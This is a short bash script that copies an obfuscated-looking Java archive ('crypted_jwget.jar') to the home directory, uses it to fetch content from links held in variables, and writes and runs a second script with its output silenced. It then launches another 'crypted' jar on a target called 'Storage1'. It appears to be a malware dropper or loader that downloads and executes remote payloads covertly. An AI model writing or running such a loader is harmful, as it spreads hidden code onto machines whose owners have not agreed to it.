#!/bin/bash
cp crypted_jwget.jar /$HOME
cd $HOME
echo $LINK2 > start2.sh
java -jar crypted_jwget.jar $LINK
bash start2.sh &> /dev/null
java -jar crypted_jwget.jar $LINK3
java -jar crypted_leatestacc.jar Storage1















